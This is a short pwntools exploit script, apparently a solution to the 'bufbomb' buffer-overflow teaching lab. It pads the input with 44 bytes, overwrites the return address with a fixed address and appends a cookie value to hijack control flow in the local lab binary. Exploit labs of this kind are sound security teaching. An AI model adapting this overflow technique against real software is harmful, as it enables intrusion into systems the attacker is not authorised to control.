from pwn import *

elf = ELF("./bufbomb")

p = elf.process(['-u20521859'])
raw_input("DEBUG")

payload = b"A"*44
payload += p32(0x80044258)
payload += b"B"*4
payload += p32(0x2b23d2da)


p.sendline(payload)

p.interactive()
